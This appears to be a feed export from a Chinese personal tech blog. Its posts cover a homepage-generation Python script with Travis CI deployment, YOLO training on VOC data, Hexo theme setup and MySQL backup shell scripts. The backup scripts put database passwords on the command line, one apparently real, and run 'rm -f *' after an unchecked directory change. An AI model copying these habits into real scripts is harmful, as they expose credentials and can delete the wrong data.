来标记，为之后的脚本文件作准备。</p><p>由于最近在弄机器学习相关的东西，python 使用的比较多，就顺手用 python 写的脚本。</p><pre><code class="python">import osimport reimport yamlimgCdnPath = &quot;http://p3q6bdexg.bkt.clouddn.com&quot;imgRule_ori = &quot;?imageMogr2/thumbnail/600x/blur/1x0/quality/75&quot;imgRule_webp = &quot;?imageMogr2/thumbnail/600x/format/webp/blur/1x0/quality/75|imageslim&quot;imgPath = &quot;https://blog.liebes.top&quot;useCdn = Truedef convert_md(filePath):    file = open(filePath, &#39;r&#39;)    content = file.read()    pattern = re.compile(r&#39;---([\s\S]*)---\n([\s\S]*)&#39;)    content = re.search(pattern, content)    prefix = content.group(1)    main = content.group(2)    pattern = re.compile(r&#39;[-`#\s]&#39;)    # print(prefix)    main = re.sub(pattern, &quot;&quot;, main)    mLen = min(len(main), 250)    main = main.decode(&#39;utf-8&#39;)[0:mLen].encode(&#39;utf-8&#39;)    pattern = re.compile(r&#39;title:( *)(.*?)( *)\n&#39;)    title = re.search(pattern, prefix).group(2)    pattern = re.compile(r&#39;date:( *)(.*?)( *)\n&#39;)    date = re.search(pattern, prefix).group(2)    pattern = re.compile(r&#39;img:( *)(.*?)( *)\n&#39;)    img = &quot;&quot;    try:         img = (imgPath, imgCdnPath)[useCdn] + re.search(pattern, prefix).group(2) + (&quot;&quot;, imgRule_ori)[useCdn]    except:        img = &quot;img/portfolio-01.jpg&quot;    webSite = &quot;https://blog.liebes.top&quot;    url = date[0:10]    url = url.replace(&quot;-&quot;, &quot;/&quot;)    basename = os.path.basename(filePath)    basename = os.path.splitext(basename)[0]    return {        &#39;title&#39;: title,        &#39;date&#39; : date,        &#39;main&#39; : main,        &#39;url&#39;  : webSite + &quot;/&quot; + url + &quot;/&quot; + basename,        &#39;src&#39;  : img    }def change_html(html_path, mdList, totalCount):    html = &quot;&quot;    html2 = &quot;&quot;    s = &quot;&quot;    template = &quot;&quot;    with open(os.getcwd() + &quot;/source/_data/li-article.html&quot;, &quot;r&quot;) as file:        template = file.read()    for idx, item in enumerate(mdList):        tem = template        tem = tem.replace(&quot;{title}&quot;, item[&#39;title&#39;])        tem = tem.replace(&quot;{url}&quot;, item[&#39;url&#39;])        tem = tem.replace(&quot;{content}&quot;, item[&#39;main&#39;])        tem = tem.replace(&quot;{src}&quot;, item[&#39;src&#39;])        s = s + tem        html2 = html2 + &quot;&lt;li&gt;&quot; + tem + &quot;&lt;/li&gt;&quot;        if idx % 3 == 2:            s = &quot;&lt;li&gt;&quot; + s + &quot;&lt;/li&gt;&quot;            html = html + s            s = &quot;&quot;    content = &quot;&quot;    with open(html_path, &#39;r&#39;) as file:        content = file.read()    content = content.replace(&quot;{articles}&quot;, html)    content = content.replace(&quot;{count}&quot;, str(totalCount))    content = content.replace(&quot;{articles2}&quot;, html2)    with open(html_path, &#39;w&#39;) as file:        file.write(content)def convert_links(filePath):    links = {}    template = &quot;&quot;    html = &quot;&quot;    html2 = &quot;&quot;    with open(filePath + &quot;/links.yaml&quot;, &#39;r&#39;) as file:        links = yaml.load(file)    with open(filePath + &quot;/li-links.html&quot;, &quot;r&quot;) as file:        template = file.read()    s = &quot;&quot;    for idx, k in enumerate(links):        tem = template        tem = tem.replace(&quot;{link}&quot;, links[k][&quot;link&quot;])        tem = tem.replace(&quot;{pic}&quot;, links[k][&quot;avatar&quot;])        tem = tem.replace(&quot;{desc}&quot;, links[k][&quot;descr&quot;])        tem = tem.replace(&quot;{name}&quot;, k)        html2 = html2 + &quot;&lt;li&gt;&quot; + tem + &quot;&lt;/li&gt;&quot;        s = s + tem        if idx % 3 == 2:            s = &quot;&lt;li&gt;&quot; + s + &quot;&lt;/li&gt;&quot;            html = html + s            s = &quot;&quot;    if s != &quot;&quot;:        s = &quot;&lt;li&gt;&quot; + s + &quot;&lt;/li&gt;&quot;        html = html + s        s = &quot;&quot;    content = &quot;&quot;    with open(os.getcwd() + &quot;/liebes.top/index.html&quot;, &quot;r&quot;) as file:        content = file.read()    content = content.replace(&quot;{links}&quot;, html.encode(&quot;utf-8&quot;))    content = content.replace(&quot;{links2}&quot;, html2.encode(&quot;utf-8&quot;))    with open(os.getcwd() + &quot;/liebes.top/index.html&quot;, &quot;w&quot;) as file:        file.write(content)def convert_gallery(filePath):    links = {}    template = &quot;&quot;    html = &quot;&quot;    html2 = &quot;&quot;    with open(filePath + &quot;/gallery.yaml&quot;, &#39;r&#39;) as file:        links = yaml.load(file)    with open(filePath + &quot;/li-gallery.html&quot;, &quot;r&quot;) as file:        template = file.read()    s = &quot;&quot;    for idx, k in enumerate(links):        tem = template        tem = tem.replace(&quot;{src}&quot;, &quot;%s&quot;%(links[k][&quot;full_link&quot;]))        #tem = tem.replace(&quot;{src}&quot;, &quot;%s%s%s&quot;%((imgPath, imgCdnPath)[useCdn], links[k][&quot;full_link&quot;], (&quot;&quot;, imgRule_ori)[useCdn]))        s = s + tem        html2 = html2 + &quot;&lt;li&gt;&quot; + tem + &quot;&lt;/li&gt;&quot;        if idx % 2 == 1:            s = &quot;&lt;div class=\&quot;col-md-4 wp4\&quot;&gt;&quot; + s + &quot;&lt;/div&gt;&quot;            html = html + s            s = &quot;&quot;        if idx == 5:            break    if s != &quot;&quot;:        s = &quot;&lt;div class=\&quot;col-md-4 wp4\&quot;&gt;&quot; + s + &quot;&lt;/div&gt;&quot;        html = html + s        s = &quot;&quot;    html = &quot;&lt;li&gt;&quot; + html + &quot;&lt;/li&gt;&quot;    content = &quot;&quot;    with open(os.getcwd() + &quot;/liebes.top/index.html&quot;, &quot;r&quot;) as file:        content = file.read()    content = content.replace(&quot;{gallery}&quot;, html.encode(&quot;utf-8&quot;))    content = content.replace(&quot;{gallery2}&quot;, html2.encode(&quot;utf-8&quot;))    with open(os.getcwd() + &quot;/liebes.top/index.html&quot;, &quot;w&quot;) as file:        file.write(content)baseDir = os.getcwd()mds = os.listdir(baseDir + &quot;/source/_posts&quot;)totalCount = len(mds)mdList = []for md in mds:    md = baseDir + &quot;/source/_posts&quot; + &quot;/&quot; + md    turple = convert_md(md)    mdList.append(turple)mdList = sorted(mdList, key = lambda item: item[&#39;date&#39;], reverse=True)mdList = mdList[0:6]change_html(baseDir + &quot;/liebes.top/index.html&quot;, mdList, totalCount)convert_links(baseDir + &quot;/source/_data&quot;)convert_gallery(baseDir + &quot;/source/_data&quot;)</code></pre><p>这份 python 文件引用了 pyyaml 这个依赖包，所以需要先安装一下。</p><pre><code> - git clone https://github.com/yaml/pyyaml.git - cd pyyaml - sudo python setup.py install</code></pre><p>具体的做法就是使用正则读取出文章最开始的数据信息，比如时间、标题等等，然后去对 html 做替换。不详说，有问题可以在评论区提问。</p><h2 id="Travis-脚本修改"><a href="#Travis-脚本修改" class="headerlink" title="Travis 脚本修改"></a>Travis 脚本修改</h2><p>本着程序员一切从简的心态，当把项目提交到 github 上之后，就应该完成一切的部署操作，于是适当修改Travis 脚本</p><pre><code>before_install:  - git clone https://github.com/yaml/pyyaml.git  - cd pyyaml  - sudo python setup.py install  - cd ..  ...script:  - python liebes.top.py  - rsync -az -vv --delete -e &#39;ssh&#39; liebes.top/ root@www.liebes.top:/var/www/www  ...</code></pre><p>当然，这需要你在服务器上提前配置好 nginx </p><h2 id="图片加载加速"><a href="#图片加载加速" class="headerlink" title="图片加载加速"></a>图片加载加速</h2><p>在我美滋滋的弄完所有的工作之后，下一个问题困扰了我：网站加载慢。如果你也是使用的阿里云最低配的服务器，你也一定会遇到这个问题。图片加载慢带来的连锁反应就是 js 的执行会等待 DOM 加载完毕，于是刚打开网站的时候就会有一种网站烂掉的错觉。</p><p>七牛云可以提供免费的对象存储服务，有免费的 10G 可以使用。</p><p><a href="https://portal.qiniu.com" target="_blank" rel="noopener">https://portal.qiniu.com</a> 七牛云网址</p><p>实名认证后可以创建对象存储资源，创建好之后在 <code>内容管理 -&gt; 上传文件</code> 上传你的文件，之后就可以使用外链进行访问了。</p><p>请一定继续将图片传到你的 git 仓库中，因为如果某一天加速服务取消了，你的图片就不见了。</p><p>这样折腾完，基本上页面加载速度会在 5s 内搞定</p><p>最后吐槽一句，写完 python 写其他语言，出现的错误基本都是没写分号 ：）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;据换完博客主题之后也有一段时间了，但总觉得哪里不对的样子，别人家都是主页和博客分开的，或者把博客放在主页的子目录下，而自己的却只有一个博客，反正自己也有域名，为什么不整个单独的主页出来呢。&lt;/p&gt;
&lt;p&gt;这篇文章记录了海痴是如何在 google 上扒模版，如何利用 trav
      
    
    </summary>
    
      <category term="个人日记" scheme="https://blog.liebes.top/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="hexo" scheme="https://blog.liebes.top/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>机器学习之 darknet YOLO 训练 VOC 数据集</title>
    <link href="https://blog.liebes.top/2018/01/30/ML-darknet-1/"/>
    <id>https://blog.liebes.top/2018/01/30/ML-darknet-1/</id>
    <published>2018-01-30T13:27:00.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>最近被安排到中汽研实习（就算是实习吧），做了一些基于深度学习的图像识别工作，其实说起来自己对深度学习也没什么太深入的了解，都是现学现卖，跑人家的例子。不过还是在这边记录一下，以后回首可以稍稍感慨一下年轻时的无知。</p><p>关于机器学习，基础知识是看<em>周志华的西瓜书（清华大学出版社的机器学习）</em>来学习的，不过大致是囫囵吞枣，没有静下心来安安稳稳地钻研（时间也不允许）。</p><p>之后看了网易云课堂中<a href="https://mooc.study.163.com/course/2001281002#/info" target="_blank" rel="noopener"><strong>吴恩达的机器学习教程</strong></a>，受益匪浅，推荐刚入门的同学去看看，讲的很好。</p><p>在吴恩达的视频中，大致了解了卷积神经网络和深度学习大致的套路，其实说到底就是各种卷积层（convolution layer），池化层（pooling layer），全连接层（fool connected layer）不断组合。</p><p>感觉机器学习想要深入了解，可能需要看很多相关的论文，之后的学习路程就记录在之后的博客中好了。</p><p>先说说甲方的需求：需要在行车过程中动态识别出前方交通标志，如果是限速标识，需要识别中里面的数字。</p><p>最近只做了第一部分，也就是交通标志的识别。对卷积神经网络有过了解的话能感觉出来这就是一个分类问题，好在公司已经标好了数据，并且是按照 VOC 格式标记的，接下来就是使用现成的网络训练就可以了。</p><p>我用的是 YOLO 在darknet 网站上有 v1 和 v2 两个版本。</p><p><a href="https://pjreddie.com/darknet/yolo/" target="_blank" rel="noopener">https://pjreddie.com/darknet/yolo/</a></p><p>以上是 YOLO darknet 版本的官网，上面的说明非常详细，也非常人性化，即使没有 GPU 也可以使用，可以简单的按照上面的教程进行安装。</p><p>注意，<code>darknet</code> 默认是不开启 <code>GPU</code> 的，当然这对没有 <code>GPU</code> 的人（比如我…）是很友好的，但这并不影响 <code>CPU</code> 训练网络慢的要死的事实。如果想要开启对 <code>GPU</code> 的支持，在 <code>Makefile</code> 最上面开启对 <code>GPU</code> 和 <code>CUDNN</code> 的支持就可以了</p><pre><code>GPU=0 // 开启GPU，使用 nvidia-smi 来查看本机 GPU 使用情况CUDNN=0 // 开启CUDA，请确保事先安装好了CUDA，可以运行 nvcc -V 来查看OPENCV=0 // 开启后可以直接查看预测后的图片OPENMP=0DEBUG=0</code></pre><p>如果顺利，此时你已经可以使用 darknet 预先训练好的 YOLO 模型检测出了样例中的物体。接下来我们要尝试使用自己的数据训练。</p><p>关于 VOC 数据集的训练在官网的教程上面也有提到。</p><pre><code>./darknet detector train cfg/voc.data cfg/yolo-voc.cfg darknet19_448.conv.23</code></pre><p>一切准备工作就绪后，上面的工作会开始训练，不过你大概会失败，因为有一些坑官网并没有提到。</p><p>首先在 voc.data 里面</p><pre><code>classes= 20train  = &lt;your work directory&gt;/darknet/train.txtvalid  = &lt;your work directory&gt;/darknet/2007_test.txtnames = data/voc.namesbackup = backup</code></pre><p>这里的 backup 是在训练工程中权重文件储存的位置，需要提前创建好这个文件夹</p><p>还需要编辑一下 cfg/yolo-voc.cfg 这个文件，将前几行的 test 次改成 train</p><pre><code>[net]# Testing //注释到测试的部分，将训练部分取消注释#batch=1#subdivisions=1# Trainingbatch=64subdivisions=8height=416width=416channels=3momentum=0.9decay=0.0005angle=0saturation = 1.5exposure = 1.5hue=.1</code></pre><p>然后应该就不会有问题了，这里建议大家用 GPU 服务器去训练，不要头铁用 CPU 去尝试，不然你会等到天荒地老。</p><p>训练结束后的权重文件在 backup 文件夹中会有保存，按照官网的例子运行就可以了</p><hr><p>然后说说自己的数据集怎么训练，公司给的数据集是按照 VOC 的格式标注的，虽然有一点不一样，不过总体上已经解决很多问题了，在转换 VOC 数据集的时候，官方提供了一个脚本 <code>voc_label.py</code> 我们修改这个文件即可。</p><p><strong>强烈建议大家复制一份配置文件出来，不要直接在原文件修改</strong></p><p>首先我们来看看在训练 VOC 的数据集中，darknet 都用到了什么。</p><p>在 cfg/voc.data 中</p><pre><code>classes= 20train  = &lt;your work directory&gt;/darknet/train.txtvalid  = &lt;your work directory&gt;/darknet/2007_test.txtnames = data/voc.namesbackup = backup</code></pre><p>classes 参数需要改成你的数据集中具体的分类数目，下面用来训练和测试的图片列表都是有上述的脚本自动生成的，voc.names 里面保存了所有分类。打开 <code>train.txt</code> 可以看到里面保存的是用来训练的图片的绝对路径，但是，真正的标注信息却没有体现，也就是 <code>VOCdevkit/VOC2007/labels</code> 下面的标签文件。本来百思不得其解，后来发现是在源码中写死的，在<code>src/data.c</code> 中有。</p><pre><code class="c">find_replace(path, &quot;images&quot;, &quot;labels&quot;, labelpath);find_replace(labelpath, &quot;JPEGImages&quot;, &quot;labels&quot;, labelpath);</code></pre><p><strong>也就是说他会根据 <code>train.txt</code> 中图片的路径，替换 <code>JPEGImages</code> 为<code>labels</code> 作为标签路径，因此在生成标签的时候一定要让标签目录与图片目录同级。</strong></p><p>如果你根据你的数据正确修改了 <code>voc_label.py</code> 这个脚本文件，那么你的准备工作应该已经接近尾声了。（训练数据和测试数据按照 10 : 1 的比率划分）</p><p>最后修改一些网络中的参数就可以了。</p><p><code>cfg/voc.data</code> 里面的 <code>classes</code> 改成你的分类数量，<code>voc.names</code> 里面存好具体分类的名称，然后修改 <code>cfg/yolo-voc.2.0.cfg</code> </p><pre><code>[convolutional]...filters=5*(N+5)...classes=N...</code></pre><p>修改上面两个参数即可，其他参数可以按需修改。</p><p>之后按照同样的操作训练即可</p><p>简单说一下训练的时候的输出</p><pre><code>Region Avg IOU: 0.432582, Class: 0.452631, Obj: 0.143766, No Obj: 0.005994, Avg Recall: 0.391304,  count: 23623: 14.499426, 14.887394 avg, 0.001000 rate, 1.074940 seconds, 39872 images</code></pre><p> 在训练的时候会有这些信息在控制台打出，简单说下这些东西的含义</p><p><code>Region Avg IOU</code> 交并比，即检测出的框框和标注的框框相交程度，期望趋近于 1</p><p><code>Avg Recall</code> 平均召回率，即检测出物体的个数除以标注的所有物体个数，期望趋近于 1</p><p><code>count</code> 标注的物体个数</p><p>最后一行的格式：</p><p>&lt;迭代次数&gt; : &lt; train loss &gt;, &lt; avg train loss &gt;, &lt;学习率&gt; …</p><p>反正我主要关心召回率和损失</p><p>据说一个模型训练要很长时间，如果你不小心退出了，没关系，<code>backup/yolo2.backup</code> 这个文件是实时备份的，所以只需要从这个备份点重新开始就可以了</p><pre><code>./darknet detector train cfg/catarc.data cfg/yolo2.0-catarc.cfg backup/yolo2.backup -gpus 0,1</code></pre><p>参考博客</p><ul><li><a href="http://blog.csdn.net/jinlong_xu/article/details/75577007" target="_blank" rel="noopener">【YOLO】详解：YOLO-darknet训练自己的数据</a></li><li><a href="http://blog.csdn.net/dcrmg/article/details/78496002" target="_blank" rel="noopener">darknet YOLOv2安装及数据集训练</a></li><li><a href="http://blog.csdn.net/renhanchi/article/details/71077830" target="_blank" rel="noopener">【Darknet】【yolo v2】训练自己数据集的一些心得—-VOC格式</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近被安排到中汽研实习（就算是实习吧），做了一些基于深度学习的图像识别工作，其实说起来自己对深度学习也没什么太深入的了解，都是现学现卖，跑人家的例子。不过还是在这边记录一下，以后回首可以稍稍感慨一下年轻时的无知。&lt;/p&gt;
&lt;p&gt;关于机器学习，基础知识是看&lt;em&gt;周志华的西瓜
      
    
    </summary>
    
      <category term="个人日记" scheme="https://blog.liebes.top/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="machine learning" scheme="https://blog.liebes.top/tags/machine-learning/"/>
    
      <category term="darknet" scheme="https://blog.liebes.top/tags/darknet/"/>
    
  </entry>
  
  <entry>
    <title>Hexo 更换 materail 主题，使用 Travis 持续集成</title>
    <link href="https://blog.liebes.top/2018/01/25/hexo-material/"/>
    <id>https://blog.liebes.top/2018/01/25/hexo-material/</id>
    <published>2018-01-25T18:27:00.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>是的，我折腾了一天把博客的模版换了一下。怎么说呢，之前用的 Next 主题，很简约，看起来也很舒服，但总觉得少点什么，后来逛了逛其他人的站，感觉 Next 主题没有图，视觉上没什么冲击力，灰蒙蒙的感觉，于是采用了 material 这个主题，也很简洁，相比之下色彩丰富一些。</p><p>之前在使用 github pages 有一些不爽的地方就是地址不是自己的域名，然而宝宝是买了域名的，为什么要在 github 下弄呢，之前尝试过使用CNAME进行域名解析，但是在处理 https 的问题上比较麻烦，想着弄一套 CI流程出来。试过 hexo 的 deploy 插件，用 rsync 进行自动部署，然而未果，各种奇怪的问题弄的头痛。最近心血来潮 google 一番，发现好多人都在用Travis CI 来自动化部署，于是尝试了一下，效果很不错。</p><p>大致整理整理安装的过程吧，在阅读下面的文字之前，你需要自己安装过一次hexo，并了解hexo。</p><h2 id="HEXO-MATERIAL-主题更换"><a href="#HEXO-MATERIAL-主题更换" class="headerlink" title="HEXO MATERIAL 主题更换"></a>HEXO MATERIAL 主题更换</h2><p>从 github 上下载 material 主题：<a href="https://github.com/viosey/hexo-theme-material" target="_blank" rel="noopener">https://github.com/viosey/hexo-theme-material</a> 下载 release 或者直接克隆项目均可，将主题包移动到 hexo 项目的 theme 中并修改博客配置文件 <code>_config.yml</code></p><pre><code>theme: material</code></pre><p>此时运行  <code>hexo s</code> 在本地就可以预览到 material 主题的样式了。接下来的步骤，完全可以按照官方的教程一项一项设置，不要嫌麻烦，因为很多特性默认都是没有的，需要自己去打开。</p><p>官方文档：<a href="https://material.viosey.com/docs/#/" target="_blank" rel="noopener">https://material.viosey.com/docs/#/</a></p><p>下面记录的是一些在安装时需要注意的地方，请先阅读一遍官方文档，再接着进行。</p><p><strong>关于首页icon</strong></p><p>有一个好的 icon 可以让博客看上去美观很多，这里推荐一个网站，有很多不错的图，而且可以DIV。</p><p><a href="https://www.canva.com/" target="_blank" rel="noopener">https://www.canva.com/</a></p><p><strong>关于侧边栏icon</strong></p><p>最开始默认的侧边栏只有主页和归档，看着空唠唠的。如果你按照文档进行，应该会将标签云、分类、时间轴等等都加上，但是对应的 icon 又不能空着，可以去这里找相应的 icon</p><p><a href="https://material.io/icons/" target="_blank" rel="noopener">https://material.io/icons/</a></p><p><strong>关于相册</strong></p><p>这个功能可能是我最喜欢的了，可以将一些生活上的照片放进来，但是会有一些问题。</p><p>首先是图片大小的问题，太大的图片会让这个单叶奇卡无比，随意在上传图片之前强烈建议进行压缩，或者使用一些图片CDN加速。</p><p>然后就是相册对竖版图片支持的并不好，尽量传横板吧，期待作者的更新</p><p><strong>关于第三方服务</strong></p><p>material 主题内嵌了很多第三方支持，按照文档，去对应的第三方网站注册就行。评论的第三方支持我用的畅言，虽然想用disqus，但是考虑到国内的大墙，还是算了。</p><h2 id="使用-TRAVIS-CI-持续集成"><a href="#使用-TRAVIS-CI-持续集成" class="headerlink" title="使用 TRAVIS CI 持续集成"></a>使用 TRAVIS CI 持续集成</h2><p>这个可以说阅读了好多好多博客了，这里就不再抄一遍别人家的了</p><p><a href="https://segmentfault.com/a/1190000009054888" target="_blank" rel="noopener">https://segmentfault.com/a/1190000009054888</a></p><p>这篇博客里面讲的就很详尽了，下面记录一些自己遇到的问题</p><p><strong>关于gem 安装travis报错</strong></p><p>这个一般是 ruby 版本或者依赖的问题，ubuntu 下我安装了下面几个依赖</p><pre><code>- ruby-dev- gcc- libffi-dev- make</code></pre><p>macOS 下直接更新了 ruby 就可以了</p><pre><code>brew updatebrew install ruby</code></pre><p><strong>关于服务器谜钥认证</strong></p><p>基本原理是将你电脑的 ssh 谜钥加密传到 travis 上去，在进行服务器连接时 travis 对谜钥进行解密，然后接下来的流程就跟使用 ssh 谜钥访问主机的方法一样了。</p><p>按照博客上面的方法，会要求将你本地的默认ssh 谜钥  <code>~/.ssh/id_rsa</code> 加密传上去，但这就会带来一个问题，一般为了安全，都会给谜钥设置一个口令，但是 CI 中没法让你输入口令。解决办法也很简单，只需要新生成一个谜钥，<code>ssh-keygen -f ~/.ssh/travis</code> 这样就会自动生成一个新的私钥和公钥，将公钥写到服务器的 <code>authorized_keys</code> 里面，上传的时候将新生成的私钥加密传到仓库即可。</p><p>在部署脚本里面，建议将解密后的秘要以默认的形式 <code>~/.ssh/id_rsa</code> 保存，虽然在 rsync 过程中可以使用 <code>ssh -i ~/.ssh/travis</code> 来制定具体使用的谜钥，但在实践部署中总是提示找不到文件，具体可以参见 <a href="https://github.com/wanghaichi/wanghaichi.github.io/blob/hexo/.travis.yml" target="_blank" rel="noopener">.travis.yml</a></p><p>上面的部署脚本建议不要拿过来直接用，如果你的 hexo 中开启了其他的组件，记得在部署脚本里面安装。</p><p>最后，如果你的博客还没有备份，请一定去备份一下。你一定会发现我的 git 仓库又两个分支，CI的触发分支是 hexo 而不是 master。教程链接： <a href="/2017/03/17/hexo-backup/">hexo 使用git备份hexo源文件</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;是的，我折腾了一天把博客的模版换了一下。怎么说呢，之前用的 Next 主题，很简约，看起来也很舒服，但总觉得少点什么，后来逛了逛其他人的站，感觉 Next 主题没有图，视觉上没什么冲击力，灰蒙蒙的感觉，于是采用了 material 这个主题，也很简洁，相比之下色彩丰富一些。
      
    
    </summary>
    
      <category term="个人日记" scheme="https://blog.liebes.top/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="hexo-theme" scheme="https://blog.liebes.top/tags/hexo-theme/"/>
    
  </entry>
  
  <entry>
    <title>Mysql 增量备份，全部备份实现方法以及自动化脚本</title>
    <link href="https://blog.liebes.top/2017/10/20/mysql-backup/"/>
    <id>https://blog.liebes.top/2017/10/20/mysql-backup/</id>
    <published>2017-10-20T00:41:45.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前情摘要"><a href="#前情摘要" class="headerlink" title="前情摘要"></a>前情摘要</h2><p>自己作死干了一件特别蠢的事情（具体略）</p><p>然后开始研究如何进行增量备份</p><h2 id="增量备份"><a href="#增量备份" class="headerlink" title="增量备份"></a>增量备份</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>mysql 有个 binlog 的功能，会记录所有的用户的操作，可以依靠这个，配合全备份，将数据库回滚到某一个特殊的时刻。hhh</p><p>简单来说，比如我们每周做一次全备份，每天做一次增量备份，当数据库发生问题的时候，我们就可以先将数据库回滚到上一周我们的全备份的时间，然后再通过每天的增量备份（其实就是模拟所有的数据库操作，全部执行一遍），将数据恢复到我们想要的时间点。</p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>mysql 的 binlog 功能需要在配置文件中打开，在 my.cnf 或者 mysqld.cnf 中添加以下几行：</p><pre><code class="shell">server-id               = 1# binlog存放路径log_bin                 = /var/log/mysql/mysql-bin.log# binlog记录的格式，有row、statement、mixed三种选项binlog-format           = row# binlog写缓冲区设置大小，由于是内存，写速度非常快，可以有效提高binlog的写效率，如果数据库中经常出现大事务，可以酌情提高该参数。binlog_cache_size       = 32m# 最大缓存区大小max_binlog_cache_size   = 512m# binlog文件最大的大小max_binlog_size         = 1000m# 需要备份的数据库名，如果备份多个数据库，重复设置这个选项即可binlog-do-db=game     binlog-do-db=platform# 不需要备份的数据库，如果备份多个数据库，重复设置这个选项即可binlog-ignore-db=</code></pre><p>重启mysql服务，在对应的文件夹下(这里是<code>/var/log/mysql</code>)会看到 <code>mysql-bin.000001</code> 和 <code>mysql-bin.index</code> 两个文件，第一个就是我们需要的 binlog 文件，里面会记录我们的操作，第二个负责记录 binlog 的名称，可以用来判断当前最新的 binlog 是哪一个</p><h3 id="一些相关的操作"><a href="#一些相关的操作" class="headerlink" title="一些相关的操作"></a>一些相关的操作</h3><p>开启了binlog之后，就可以进行一些尝试了，可以先去数据库做一些修改操作。（因为binlog的格式选择的是row，所以select语句是不会被记录的）</p><pre><code class="mysql">mysql&gt; UPDATE ....mysql&gt; DELETE ....// 查看当前log的备份情况mysql&gt; show master logs;// 查看最新的备份文件的情况mysql&gt; show master status;// 将当前的log写入磁盘，并创建新的binlog文件mysql&gt; flush log;</code></pre><p>binlog 文件可以使用 mysqlbinlog 命令查看</p><pre><code class="mysql">// 查看binlogfile即可看到这份log中记录的数据库操作mysqlbinlog mysql-bin.000011 &gt; /tmp/binlogfile// 获取指定位置范围的记录mysqlbinlog --start-position=1285 --stop-position=1681 mysql-bin.000011 &gt; /tmp/binlogfile// 获取指定时间范围内的记录，常用mysqlbinlog --start-date=&quot;2012-10-15 16:30:00&quot; --stop-date=&quot;2012-10-15 17:00:00&quot;</code></pre><h2 id="全备份"><a href="#全备份" class="headerlink" title="全备份"></a>全备份</h2><p>全备份没什么好说的，mysqldump一条命令就可以了</p><pre><code>mysqldump -uroot -ppwd --quick --all-databases --flush-logs --delete-master-logs --single-transaction &gt; $dumpFile</code></pre><p>注意里面的一些参数，尤其是flush-logs和single-transaction两个参数，建议开启</p><h2 id="自动化脚本"><a href="#自动化脚本" class="headerlink" title="自动化脚本"></a>自动化脚本</h2><p>全备份</p><pre><code class="shell">#!/bin/bash# 全备份路径backDir=/var/log/mysql/backup/weekly# 日志文件logFile=/var/log/mysql/backup/bak-all.log# 获取当前时间，用于命名nowDate=`date +%Y%m%d`beginTime=`date +&quot;%Y%m%d %H:%M:%S&quot;`# 进入备份文件夹cd $backDirdumpFile=$nowDate.sqldumpFileTgz=$nowDate.sql.tgz# mysqldump 导出所有数据库echo dumping...mysqldump -uroot -ppwd --quick --all-databases --flush-logs --delete-master-logs --single-transaction &gt; $dumpFileecho compressing...# 压缩文件tar czvf $dumpFileTgz $dumpFilerm $dumpFileendTime=`date +&quot;%Y%m%d %H:%M:%S&quot;`echo begin:$beginTime end:$endTime $dumpFileTgz succ &gt;&gt; $logFile# 清楚之前的增量备份cd $backDir/../dailyrm -f *</code></pre><p>增量备份脚本</p><pre><code>#!/bin/bash# 增量备份存放路径backDir=/var/log/mysql/backup/daily# binlog存放路径binDir=/var/log/mysql/# 日志文件logFile=/var/log/mysql/backup/bak-daily.log# binlog.index 文件路径binIndex=/var/log/mysql/mysql-bin.index# 将当前所有的日志写到磁盘，会新建一个00000*的binlog文件mysqladmin -uroot -phhxxttxs flush-logs# 获取当前有几条binlog文件（需要保证是从1开始的）count=`wc -l $binIndex | awk &#39;{print $1}&#39;`nextNum=0for file in  `cat $binIndex`do    # 获取文件名，去除文件夹名    base=`basename $file`    # 遍历每个binlog文件，如果是最新的不做操作，否则备份    nextNum=`expr $nextNum + 1`    if [ $nextNum -eq $count ]    then        echo $base skip!  &gt;&gt; $logFile    else        dest=$backDir/$base        # file already exist        if(test -e $dest)        then            echo  $base exist! &gt;&gt; $logFile           else            cp $binDir/$base $backDir            echo $base copyed &gt;&gt; $logFile        fi    fidoneecho `date +&quot;%Y%m%d %H:%M:%S&quot;` Backup succ! &gt;&gt; $logFile</code></pre><p>做一下定时就好了</p><h2 id="具体恢复操作"><a href="#具体恢复操作" class="headerlink" title="具体恢复操作"></a>具体恢复操作</h2><p>当发现数据丢失时</p><ol><li>确认丢失数据的开始时间</li><li>找到距离这个时间最近的全量备份</li><li>mysql -uuser -p &lt; all.sql</li><li>依次运行从全备份到丢失时间之间的增量备份</li><li>mysqlbinlog mysql-bin.000123 –start-date=”” –end-date=”” &gt; /tmp/tmpfile</li><li>mysql -uuser -p &lt; /tmp/tmpfile</li></ol><p>通过以上，就可以将数据还原到需要的还原点。<br>记得定期查看备份的log文件，以防出现问题，全备份需要定时清理</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前情摘要&quot;&gt;&lt;a href=&quot;#前情摘要&quot; class=&quot;headerlink&quot; title=&quot;前情摘要&quot;&gt;&lt;/a&gt;前情摘要&lt;/h2&gt;&lt;p&gt;自己作死干了一件特别蠢的事情（具体略）&lt;/p&gt;
&lt;p&gt;然后开始研究如何进行增量备份&lt;/p&gt;
&lt;h2 id=&quot;增量备份&quot;&gt;&lt;a
      
    
    </summary>
    
    
      <category term="mysql" scheme="https://blog.liebes.top/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>编辑器带来的XSS漏洞问题解决方案</title>
    <link href="https://blog.liebes.top/2017/07/11/editor-xss/"/>
    <id>https://blog.liebes.top/2017/07/11/editor-xss/</id>
    <published>2017-07-11T20:47:08.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
